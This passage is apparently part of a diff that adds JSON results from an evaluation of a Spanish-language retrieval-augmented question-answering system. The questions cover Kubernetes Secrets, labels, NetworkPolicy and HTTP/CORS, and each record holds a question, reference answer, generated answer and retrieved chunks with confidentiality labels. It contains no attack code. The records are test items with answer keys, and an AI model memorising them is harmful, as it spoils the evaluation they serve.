+      "referencia": "1 MiB, para no agotar la memoria del apiserver y del kubelet. (Documento marcado como restringido: con filtro de permisos, debe responder que no lo tiene.)",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.07,
+      "respuesta": "Los `Secrets` individuales están limitados a 1MiB de tamaño. Esto es para desalentar la creación de `Secrets` muy grandes que agotarían la memoria del apiserver y de kubelet [1].",
+      "respuesta_cruda": "Los `Secrets` individuales están limitados a 1MiB de tamaño. Esto es para desalentar la creación de `Secrets` muy grandes que agotarían la memoria del apiserver y de kubelet [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Secrets > Detalles > Restricciones\nLas fuentes del volumen del  Secret  se validan para garantizar que la referencia del objeto especificado apunte a un objeto de tipo `Secret`. Por lo tanto, se debe crear un `Secret` antes de que cualquier pod dependa de él.  \nLos objetos API Secret residen en namespace.\nSolo pueden ser referenciados por pods en el mismo namespace.  \nLos `Secrets` individuales estan limitados a 1MiB de tamaño.  Esto es para desalentar la creación de `Secrets` muy grandes que agotarían la memoria del apiserver y de kubelet.\nSin embargo la creación de muchos Secrets más pequeños también podría agotar la memoria. Límites más completos en el uso de memoria debido a `Secret` es una característica planificada.",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets > Detalles > Restricciones",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.9586
+        },
+        {
+          "texto": "Secrets > Introducción a Secrets > Creando tu propio Secret\nData\n====\npassword.txt:    12 bytes\nusername.txt:    5 bytes\n```  \n> **Nota:**\n`kubectl get` y `kubectl describe` evita mostrar el contenido de un Secret por defecto.\nEsto es para proteger el Secret de ser expuesto accidentalmente a un espectador, o de ser almacenado en un registro de terminal.  \nVer Decodificando un Secret para ver el contenido de un Secret.  \n#### Creando un Secret Manualmente  \nPuedes crear también un Secret primero en un archivo, en formato json o en yaml, y luego crear ese objeto. El\nSecret contiene dos mapas:\ndata y stringData. El campo de data es usado para almacenar datos arbitrarios, codificado usando base64. El campo stringData se proporciona para su conveniencia, y le permite proporcionar datos secretos como cadenas no codificadas.",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets > Introducción a Secrets > Creando tu propio Secret",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.1768
+        },
+        {
+          "texto": "Secrets > Propiedades de seguridad > Protecciones\nPuede haber Secrets para varios Pods en el mismo nodo. Sin embargo, solo los Secrets que solicita un Pod son potencialmente visibles dentro de sus contenedores. Por lo tanto, un Pod no tiene acceso a los Secrets de otro Pod.  \nPuede haber varios contenedores en un Pod. Sin embargo, cada contenedor en un pod tiene que solicitar el volumen del Secret en su\n`volumeMounts` para que sea visible dentro del contenedor. Esto se puede usar para construir particiones de seguridad útiles en el Pod level](#use-case-secret-visible-to-one-container-in-a-pod).  \nEn la mayoría de las distribuciones Kubernetes-project-maintained, la comunicación entre usuario a el apiserver, y del apiserver a kubelets, ista protegido por SSL/TLS.\nLos Secrets estan protegidos cuando se transmiten por estos canales.",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets > Propiedades de seguridad > Protecciones",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.1181
+        },
+        {
+          "texto": "Secrets > Introducción a Secrets\nUn Secret es un objeto que contiene una pequeña cantidad de datos confidenciales como contraseñas, un token, o una llave.  Tal información podría ser puesta en la especificación de un Pod o en una imagen; poniendolo en un objeto de tipo Secret permite mayor control sobre como se usa, y reduce el riesgo de exposicición accidental.  \nLos usuarios pueden crear Secrets, y el sistema también puede crearlos.  \nPara usar un Secret, un Pod debe hacer referencia a este. Un Secret puede ser usado con un Pod de dos formas: como archivos en un volume montado en uno o más de sus contenedores, o utilizados por el kubelet al extraer imágenes del pod.",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets > Introducción a Secrets",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.1061
+        },
+        {
+          "texto": "Secrets > Usando Secrets > Usando Secrets como Archivos de un Pod\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\nname: mypod\nspec:\ncontainers:\n- name: mypod\nimage: redis\nvolumeMounts:\n- name: foo\nmountPath: \"/etc/foo\"\nvolumes:\n- name: foo\nsecret:\nsecretName: mysecret\ndefaultMode: 256\n```  \nEntonces, el Secret será montado en `/etc/foo` y todos los  archivos creados por el\nmontaje del volumen del Secret tendrán permiso `0400`.  \nTenga en cuenta que la especificación JSON no soporta la notación octal, entonces use el valor 256 para\npermisos 0400. Si usa yaml en lugar de json para el pod, puede usar notación octal para especificar permisos de una manera más natural.  \nTambién puede usar el mapeo, como en el ejemplo anterior,  y especificar diferentes permisos para diferentes archivos como:  \n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\nname: mypod\nspec:",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets > Usando Secrets > Usando Secrets como Archivos de un Pod",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.0984
+        }
+      ]
+    },
+    {
+      "id": 13,
+      "tipo": "multi_hop",
+      "pregunta": "¿Qué tipo de base de datos usa Kubernetes para guardar los Secrets?",
+      "con_respuesta": true,
+      "referencia": "Los Secrets se guardan en etcd (doc. de Secrets), que es un almacén clave-valor persistente, consistente y distribuido (doc. de componentes).",
+      "recall5": false,
+      "no_lo_tengo": true,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 9.66,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": "No lo tengo en la documentación.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Secrets\nLos objetos de tipo Secret en Kubernetes te permiten almacenar y administrar información confidencial, como\ncontraseñas, tokens OAuth y llaves ssh.  Poniendo esta información en un Secret\nes más seguro y más flexible que ponerlo en la definición de un pod o en un container image. Ver Secrets design document para más información.",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.9742
+        },
+        {
+          "texto": "Secrets > Introducción a Secrets > Secrets incorporados\n#### Las Cuentas de Servicio Crean y Adjuntan Secrets con las Credenciales de la API  \nKubernetes crea automaticamente Secrets que contienen credenciales para acceder a la API y modifica automáticamente sus pods para usar este tipo de Secret.  \nLa creación y el uso automático de las credenciales de la API, pueden desabilitarse o anularse si se desea. Sin embargo, si todo lo que necesita hacer es acceder de forma segura al apiserver, este es el flujo de trabajo recomendado.  \nVer la documentación de Service Account para más información sobre cómo funcionan las Cuentas de Servicio.",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets > Introducción a Secrets > Secrets incorporados",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.8203
+        },
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad de la Infraestructura {#infrastructure-security}\nAcceso a etcd | El acceso a etcd (banco de datos de Kubernetes) debe ser limitado apenas al plano de control. Dependiendo de su configuración, debería intentar usar etcd sobre TLS. Puede encontrar mas información en la documentación de etcd.\nEncriptación etcd | Siempre que sea posible, es una buena práctica encriptar todas las unidades de almacenamiento. Etcd mantiene el estado de todo el clúster (incluidos los Secretos), por lo que su disco debe estar encriptado.",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad de la Infraestructura {#infrastructure-security}",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8178
+        },
+        {
+          "texto": "Secrets > Mejores prácticas > Clientes que usan la API de Secrets\nAl implementar aplicaciones que interactuan con los API Secrets, el acceso debe limitarse utilizando authorization policies como RBAC.  \nLos Secrets a menudo contienen valores que abarcan un espectro de importancia, muchos de los cuales pueden causar escalamientos dentro de Kubernetes (ejememplo, tokens de cuentas de servicio) y a sistemas externos. Incluso si  una aplicación individual puede razonar sobre el poder de los Secrets con los que espera interactuar, otras aplicaciones dentro dle mismo namespace pueden invalidar esos supuestos.",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets > Mejores prácticas > Clientes que usan la API de Secrets",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.7191
+        },
+        {
+          "texto": "Secrets > Propiedades de seguridad > Protecciones\nPuede haber Secrets para varios Pods en el mismo nodo. Sin embargo, solo los Secrets que solicita un Pod son potencialmente visibles dentro de sus contenedores. Por lo tanto, un Pod no tiene acceso a los Secrets de otro Pod.  \nPuede haber varios contenedores en un Pod. Sin embargo, cada contenedor en un pod tiene que solicitar el volumen del Secret en su\n`volumeMounts` para que sea visible dentro del contenedor. Esto se puede usar para construir particiones de seguridad útiles en el Pod level](#use-case-secret-visible-to-one-container-in-a-pod).  \nEn la mayoría de las distribuciones Kubernetes-project-maintained, la comunicación entre usuario a el apiserver, y del apiserver a kubelets, ista protegido por SSL/TLS.\nLos Secrets estan protegidos cuando se transmiten por estos canales.",
+          "fuente": "06-k8s-secrets.md",
+          "seccion": "Secrets > Propiedades de seguridad > Protecciones",
+          "confidencialidad": "restringido",
+          "puntuacion": 0.6844
+        }
+      ]
+    },
+    {
+      "id": 14,
+      "tipo": "numerico",
+      "pregunta": "¿Cuántos caracteres puede tener como máximo el valor de una etiqueta en Kubernetes?",
+      "con_respuesta": true,
+      "referencia": "63 caracteres, empezando y terminando por un carácter alfanumérico.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.0,
+      "respuesta": "Los valores de etiqueta válidos deben tener como máximo 63 caracteres [1].",
+      "respuesta_cruda": "Los valores de etiqueta válidos deben tener como máximo 63 caracteres [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Etiquetas y Selectores > Sintaxis y conjunto de caracteres\nSi se omite el prefijo, la clave de la etiqueta se entiende que es privada para el usuario. Los componentes automatizados del sistema (ej. `kube-scheduler`, `kube-controller-manager`, `kube-apiserver`, `kubectl`, u otros de terceras partes) que añaden etiquetas a los objetos de usuario deben especificar obligatoriamente un prefijo.  \nLos prefijos `kubernetes.io/` y `k8s.io/` están reservados para el sistema de Kubernetes.  \nLos valores de etiqueta válidos deben tener como máximo 63 caracteres y empezar y terminar con un carácter alfanumérico (`[a-z0-9A-Z]`), con guiones (`-`), guiones bajos (`_`), puntos (`.`), y cualquier carácter alfanumérico en medio.",
+          "fuente": "07-k8s-etiquetas-selectores.md",
+          "seccion": "Etiquetas y Selectores > Sintaxis y conjunto de caracteres",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9995
+        },
+        {
+          "texto": "Etiquetas y Selectores > Sintaxis y conjunto de caracteres\nLas _etiquetas_ son pares de clave/valor. Las claves válidas de etiqueta tienen dos partes: un prefijo opcional y un nombre, separados por una barra (`/`). La parte del nombre es obligatoria y debe ser menor o igual a 63 caracteres, empezando y terminando con un carácter alfanumérico (`[a-z0-9A-Z]`), con guiones (`-`), guiones bajos (`_`), puntos (`.`), y cualquier carácter alfanumérico en medio. El prefijo es opcional. Si se indica, este debe ser un subdominio DNS: una serie de etiquetas DNS separadas por puntos (`.`), no mayores de 253 caracteres en total, seguidas de una barra (`/`).",
+          "fuente": "07-k8s-etiquetas-selectores.md",
+          "seccion": "Etiquetas y Selectores > Sintaxis y conjunto de caracteres",
+          "confidencialidad": "publico",
+          "puntuacion": 0.6068
+        },
+        {
+          "texto": "Políticas de red (Network Policies) > Cómo apuntar a un Namespace usando su nombre\nEl plano de control de Kubernetes establece una etiqueta inmutable `kubernetes.io/metadata.name` en todos los\nNamespaces, siempre que se haya habilitado la feature gate `NamespaceDefaultLabelName`.\nEl valor de la etiqueta es el nombre del Namespace.  \nAunque NetworkPolicy no puede apuntar a un Namespace por su nombre con algún campo de objeto, puede utilizar la etiqueta estandarizada para apuntar a un Namespace específico.",
+          "fuente": "08-k8s-network-policies.md",
+          "seccion": "Políticas de red (Network Policies) > Cómo apuntar a un Namespace usando su nombre",
+          "confidencialidad": "publico",
+          "puntuacion": 0.153
+        },
+        {
+          "texto": "Etiquetas y Selectores > Selectores de etiquetas\nAl contrario que los nombres y UIDs, las etiquetas no garantizan la unicidad. En general, se espera que muchos objetos compartan la(s) misma(s) etiqueta(s).  \nA través del _selector de etiqueta_, el cliente/usuario puede identificar un conjunto de objetos. El selector de etiqueta es la primitiva principal de agrupación en Kubernetes.  \nLa API actualmente soporta dos tipos de selectores: _basados en igualdad_ y _basados en conjunto_.\nUn selector de etiqueta puede componerse de múltiples _requisitos_ separados por coma. En el caso de múltiples requisitos, todos ellos deben ser satisfechos de forma que las comas actúan como operadores _AND_ (`&&`) lógicos.  \nLa semántica de selectores vacíos o no espefificados es dependiente del contexto,",
+          "fuente": "07-k8s-etiquetas-selectores.md",
+          "seccion": "Etiquetas y Selectores > Selectores de etiquetas",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0857
+        },
+        {
+          "texto": "¿Qué es Kubernetes? > ¿Qué hace de Kubernetes una plataforma?\nA pesar de que Kubernetes ya ofrece muchas funcionalidades, siempre hay nuevos\nescenarios que se benefician de nuevas características. Los flujos de trabajo\nde las aplicaciones pueden optimizarse para acelerar el tiempo de desarrollo.\nUna solución de orquestación propia puede ser suficiente al principio, pero suele requerir\nuna automatización robusta cuando necesita escalar. Es por ello que Kubernetes fue diseñada como\nuna plataforma: para poder construir un ecosistema de componentes y herramientas que hacen\nmás fácil el desplegar, escalar y administrar aplicaciones.  \nLas etiquetas, o Labels, le\npermiten a los usuarios organizar sus recursos como deseen. Las anotaciones, o Annotations, les permiten asignar información arbitraria a un recurso para",
+          "fuente": "01-k8s-que-es-kubernetes.md",
+          "seccion": "¿Qué es Kubernetes? > ¿Qué hace de Kubernetes una plataforma?",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0623
+        }
+      ]
+    },
+    {
+      "id": 15,
+      "tipo": "factual",
+      "pregunta": "Si no hay ninguna NetworkPolicy, ¿un Pod acepta conexiones entrantes?",
+      "con_respuesta": true,
+      "referencia": "Sí. Por defecto un Pod no está aislado para la entrada: se permiten todas las conexiones entrantes.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 9.17,
+      "respuesta": "Sí, si no hay ninguna NetworkPolicy, un Pod acepta conexiones entrantes por defecto. Esto se menciona en el primer documento [1].",
+      "respuesta_cruda": "Sí, si no hay ninguna NetworkPolicy, un Pod acepta conexiones entrantes por defecto. Esto se menciona en el primer documento [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Políticas de red (Network Policies) > Dos Tipos de Aislamiento de Pod\nPor defecto, un Pod no está aislado para la entrada; todas las conexiones entrantes están permitidas. Un Pod está aislado para la entrada si hay alguna NetworkPolicy con \"Ingress\" en su `policyTypes` que seleccione el Pod; decimos que tal política se aplica al Pod para la entrada. Cuando un Pod está aislado para la entrada, las únicas conexiones permitidas en el Pod son las del nodo del Pod y las permitidas por la lista `ingress` de alguna NetworkPolicy que se apliquen al Pod para la entrada. Los valores de esas listas de direcciones se combinan de forma aditiva.",
+          "fuente": "08-k8s-network-policies.md",
+          "seccion": "Políticas de red (Network Policies) > Dos Tipos de Aislamiento de Pod",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9975
+        },
+        {
+          "texto": "Políticas de red (Network Policies) > Dos Tipos de Aislamiento de Pod\nPor defecto, un Pod no está aislado para la salida; todas las conexiones salientes están permitidas. Un Pod está aislado para la salida si hay alguna NetworkPolicy con \"Egress\" en su `policyTypes` que seleccione el Pod; decimos que tal política se aplica al Pod para la salida. Cuando un Pod está aislado para la salida, las únicas conexiones permitidas desde el Pod son las permitidas por la lista `egress` de las NetworkPolicy que se apliquen al Pod para la salida. Los valores de esas listas `egress` se combinan de forma aditiva.",
+          "fuente": "08-k8s-network-policies.md",
+          "seccion": "Políticas de red (Network Policies) > Dos Tipos de Aislamiento de Pod",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9877
+        },
+        {
+          "texto": "Políticas de red (Network Policies) > Políticas por defecto > Permitir todo el tráfico de entrada\nSi quieres permitir todo el tráfico de entrada a todos los Pods en un Namespace, puedes crear una política que explícitamente permita eso.  \nCon esta política en curso, ninguna política(s) adicional puede hacer que se niegue cualquier conexión entrante a esos Pods. Esta política no tiene efecto sobre el aislamiento del tráfico de salida de cualquier Pod.",
+          "fuente": "08-k8s-network-policies.md",
+          "seccion": "Políticas de red (Network Policies) > Políticas por defecto > Permitir todo el tráfico de entrada",
+          "confidencialidad": "publico",
+          "puntuacion": 0.929
+        },
+        {
+          "texto": "Políticas de red (Network Policies) > Dos Tipos de Aislamiento de Pod\nLas políticas de red no entran en conflicto; son aditivas. Si alguna política(s) se aplica a un Pod para una dirección determinada, las conexiones permitidas en esa dirección desde ese Pod son la unión de lo que permiten las políticas aplicables. Por lo tanto, el orden de evaluación no afecta al resultado de la política.  \nPara que se permita una conexión desde un Pod de origen a un Pod de destino, tanto la política de salida del Pod de origen como la de entrada del Pod de destino deben permitir la conexión. Si cualquiera de los dos lados no permite la conexión, ésta no se producirá.",
+          "fuente": "08-k8s-network-policies.md",
+          "seccion": "Políticas de red (Network Policies) > Dos Tipos de Aislamiento de Pod",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9226
+        },
+        {
+          "texto": "Políticas de red (Network Policies) > Políticas por defecto > Denegar por defecto todo el tráfico de entrada y de salida\nPuedes crear una política que \"por defecto\" en un Namespace impida todo el tráfico de entrada y de salida creando la siguiente NetworkPolicy en ese Namespace.  \nEsto asegura que incluso los Pods que no son seleccionados por ninguna otra NetworkPolicy no tendrán permitido el tráfico de entrada o salida.",
+          "fuente": "08-k8s-network-policies.md",
+          "seccion": "Políticas de red (Network Policies) > Políticas por defecto > Denegar por defecto todo el tráfico de entrada y de salida",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9046
+        }
+      ]
+    },
+    {
+      "id": 16,
+      "tipo": "factual",
+      "pregunta": "¿Cuáles son las 4C de la seguridad cloud native?",
+      "con_respuesta": true,
+      "referencia": "Cloud (la nube), Clústeres, Contenedores y Código.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 11.78,
+      "respuesta": "Las 4C de la seguridad en Cloud Native son:\n\n1. Nube (Cloud)\n2. Clústeres\n3. Contenedores\n4. Código\n\nEste enfoque por capas aumenta la defensa en profundidad de la seguridad y es considerado una buena práctica para el software de sistemas [1].",
+      "respuesta_cruda": "Las 4C de la seguridad en Cloud Native son:\n\n1. Nube (Cloud)\n2. Clústeres\n3. Contenedores\n4. Código\n\nEste enfoque por capas aumenta la defensa en profundidad de la seguridad y es considerado una buena práctica para el software de sistemas [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Las 4C de Seguridad en Cloud Native\nPuede pensar en seguridad por capas. Las 4C de la seguridad en Cloud Native son la nube (Cloud),\nClústeres, Contenedores y Código.  \n> **Nota:**\nEste enfoque en capas aumenta la defensa en profundidad)\nde la seguridad, es considerada una buena práctica en seguridad para el software de sistemas.  \nCada capa del modelo de seguridad Cloud Native es basada en la siguiente capa más externa.\nLa capa de código se beneficia de una base sólida (nube, clúster, contenedor) de capas seguras.\nNo podemos garantizar la seguridad aplicando solo seguridad a nivel del código, y usar estándares de seguridad deficientes en las otras capas.",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Las 4C de Seguridad en Cloud Native",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9999
+        },
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad de la Infraestructura {#infrastructure-security}\nAcceso a la red de los Nodos | Los nodos deben ser configurados para _solo_ aceptar conexiones (por medio de listas de control de acceso a la red) desde el plano de control en los puertos especificados y aceptar conexiones para servicios en Kubernetes del tipo NodePort y LoadBalancer. Si es posible, estos nodos no deben exponerse públicamente en Internet.\nAcceso a la API de Kubernetes del proveedor de la nube | Cada proveedor de la nube debe dar un conjunto de permisos al plano de control y nodos del Kubernetes. Es mejor otorgar al clúster el permiso de acceso al proveedor de nube siguiendo el principio de mínimo privilegio para los recursos que necesite administrar. La documentación del Kops ofrece información sobre las políticas y roles de IAM.",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Nube (Cloud) > Seguridad de la Infraestructura {#infrastructure-security}",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2424
+        },
+        {
+          "texto": "Vista General de Seguridad Cloud Native\nEsta descripción general define un modelo para la seguridad de Kubernetes en el contexto de Seguridad en Cloud Native.  \n> **Nota:**\nEste modelo de seguridad en el contenedor brinda sugerencias, no es una prueba de políticas de seguridad de la información.",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2356
+        },
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Código > Seguridad del código\nLimitación de rangos de puertos de comunicación | Esta recomendación puede ser un poco evidente, pero siempre que sea posible, solo debe exponer los puertos de su servicio que son absolutamente esenciales para la comunicación o la recopilación de métricas. |\nSeguridad en dependencia de terceros | Es una buena práctica comprobar periódicamente las bibliotecas de terceros de su aplicación en busca de vulnerabilidades de seguridad. Cada lenguaje de programación tiene una herramienta para realizar esta verificación de forma automática. |",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Código > Seguridad del código",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2331
+        },
+        {
+          "texto": "Vista General de Seguridad Cloud Native > Nube (Cloud)\nEn muchos sentidos, la nube (o los servidores o el centro de datos corporativo) es la\nbase de computador confiable\nde un clúster de Kubernetes. Si la capa de la nube es vulnerable (o\nconfigurado de alguna manera vulnerable), por consecuencia no hay garantía de que los componentes construidos\nencima de la base sean seguros. Cada proveedor de la nube tiene recomendaciones de seguridad\npara ejecutar las cargas de trabajo de forma segura en sus entornos.",
+          "fuente": "09-k8s-seguridad-cloud-native.md",
+          "seccion": "Vista General de Seguridad Cloud Native > Nube (Cloud)",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2213
+        }
+      ]
+    },
+    {
+      "id": 17,
+      "tipo": "factual",
+      "pregunta": "¿HTTP guarda información entre una petición y la siguiente?",
+      "con_respuesta": true,
+      "referencia": "No, es un protocolo sin estado. Las cookies permiten mantener sesiones con estado.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.65,
+      "respuesta": "No, HTTP es un protocolo sin estado, lo que significa que no guarda ningún dato entre dos peticiones en la misma sesión [1]. Sin embargo, el uso de cookies permite guardar datos con respecto a la sesión de comunicación, creando así un contexto común para cada sesión de comunicación [1].",
+      "respuesta_cruda": "No, HTTP es un protocolo sin estado, lo que significa que no guarda ningún dato entre dos peticiones en la misma sesión [1]. Sin embargo, el uso de cookies permite guardar datos con respecto a la sesión de comunicación, creando así un contexto común para cada sesión de comunicación [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Generalidades del protocolo HTTP > Características clave del protocolo HTTP > HTTP es un protocolo con sesiones, pero sin estados\nHTTP es un protocolo sin estado, es decir: no guarda ningún dato entre dos peticiones en la mísma sesión. Esto crea problemáticas, en caso de que los usuarios requieran interactuar con determinadas páginas Web de forma ordenada y coherente, por ejemplo, para el uso de \"cestas de la compra\" en páginas que utilizan en comercio electrónico. Pero, mientras HTTP ciertamente es un protocolo sin estado, el uso de HTTP cookies, si permite guardar datos con respecto a la sesión de comunicación. Usando la capacidad de ampliación del protocolo HTTP, las cookies permiten crear un contexto común para cada sesión de comunicación.",
+          "fuente": "16-http-vision-general.md",
+          "seccion": "Generalidades del protocolo HTTP > Características clave del protocolo HTTP > HTTP es un protocolo con sesiones, pero sin estados",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9864
+        },
+        {
+          "texto": "HTTP cookies\nUna cookie HTTP, cookie web o cookie de navegador es una pequeña pieza de datos que un servidor envía a el navegador web del usuario. El navegador guarda estos datos y los envía de regreso junto con la nueva petición al mismo servidor. Las cookies se usan generalmente para decirle al servidor que dos peticiones tienen su origen en el mismo navegador web lo que permite, por ejemplo, mantener la sesión de un usuario abierta. Las cookies permiten recordar la información de estado en vista a que el protocolo HTTP es un protocolo sin estado.  \nLas cookies se utilizan principalmente con tres propósitos:  \n- Gestión de Sesiones\n- : Inicios de sesión, carritos de compras, puntajes de juegos o cualquier otra cosa que el servidor deba recordar\n- Personalización",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8865
+        },
+        {
+          "texto": "HTTP caching > Visión general\nLa caché HTTP almacena una respuesta asociada con una solicitud y reutiliza la respuesta almacenada para solicitudes posteriores.  \nHay varias ventajas de reusabilidad. En primer lugar, dado que no es necesario enviar la solicitu al servidor origen, cuanto más cerca están el cliente y la caché, más rápida será la respuesta. El ejemplo más típico es cuando el navegador almacena una caché para las solicitudes.  \nAdemás, cuando una respuesta es reutilizable, el servidor de origen no necesita procesar la solicitud, por lo que no necesita parsear y enrutar la solicitud, restaurar la sesión en función de la cookie, consultar los resultados de la base de datos o renderizar la plantilla. Eso reduce la carga en el servidor.",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > Visión general",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8614
+        },
+        {
+          "texto": "Generalidades del protocolo HTTP > Arquitectura de los sistemas basados en HTTP\nHTTP es un protocolo basado en el principio de cliente-servidor: las peticiones son enviadas por una entidad: el agente del usuario (o un proxy a petición de uno). La mayoría de las veces el agente del usuario (cliente) es un navegador Web, pero podría ser cualquier otro programa, como por ejemplo un programa-robot, que explore la Web, para adquirir datos de su estructura y contenido para uso de un buscador de Internet.  \nCada petición individual se envía a un servidor, el cuál la gestiona y responde. Entre cada _petición_ y _respuesta_, hay varios intermediarios, normalmente denominados proxies, los cuales realizan distintas funciones, como: gateways o caches.",
+          "fuente": "16-http-vision-general.md",
+          "seccion": "Generalidades del protocolo HTTP > Arquitectura de los sistemas basados en HTTP",
+          "confidencialidad": "publico",
+          "puntuacion": 0.7214
+        },
+        {
+          "texto": "Generalidades del protocolo HTTP\nHTTP, de sus siglas en inglés: \"Hypertext Transfer Protocol\", es el nombre de un protocolo el cual nos permite realizar una petición de datos y recursos, como pueden ser documentos HTML. Es la base de cualquier intercambio de datos en la Web, y un protocolo de estructura cliente-servidor, esto quiere decir que una petición de datos es iniciada por el elemento que recibirá los datos (el cliente), normalmente un navegador Web. Así, una página web completa resulta de la unión de distintos sub-documentos recibidos, como, por ejemplo: un documento que especifique el estilo de maquetación de la página web (CSS), el texto, las imágenes, vídeos, scripts, etc...",
+          "fuente": "16-http-vision-general.md",
+          "seccion": "Generalidades del protocolo HTTP",
+          "confidencialidad": "publico",
+          "puntuacion": 0.4946
+        }
+      ]
+    },
+    {
+      "id": 18,
+      "tipo": "factual",
+      "pregunta": "¿Qué método HTTP usa el navegador en la verificación previa (preflight) de CORS?",
+      "con_respuesta": true,
+      "referencia": "OPTIONS.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 9.32,
+      "respuesta": "El navegador utiliza el método HTTP `OPTIONS` para realizar la solicitud de verificación previa (preflight) en CORS [2].",
+      "respuesta_cruda": "El navegador utiliza el método HTTP `OPTIONS` para realizar la solicitud de verificación previa (preflight) en CORS [2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS)\n**El intercambio de recursos de origen cruzado** (CORS, por sus siglas en inglés), es un mecanismo basado en cabeceras HTTP que permite a un servidor indicar cualquier dominio, esquema o puerto con un origen distinto del suyo desde el que un navegador debería permitir la carga de recursos. CORS también se basa en un mecanismo por el cual los navegadores realizan una solicitud de \"verificación previa\" al servidor que aloja el recurso de origen cruzado, con el fin de comprobar que el servidor permitirá la solicitud real. En esa comprobación previa, el navegador envía cabeceras que indican el método HTTP y las cabeceras que se utilizarán en la solicitud real.",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS)",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9897
+        },
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes verificadas previamente\nVary: Accept-Encoding, Origin\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\n```  \nLas primeras diez líneas representan la solicitud de verificación previa con el método `OPTIONS`. El navegador determina que necesita enviar esto basándose en los parámetros de petición que el fragmento de código JavaScript de arriba ha usado, para que el servidor pueda responder si es aceptable enviar la petición con los parámetros de solicitud reales. OPTIONS es un método HTTP/1.1 que se utiliza para determinar con más detalle la información de los servidores y es un método seguro, lo que significa que no se puede utilizar para cambiar el recurso. Observe que junto con la solicitud OPTIONS, se envían otras dos cabeceras de solicitud (líneas nueve y diez respectivamente):  \n```http",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes verificadas previamente",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9802
+        },
+        {
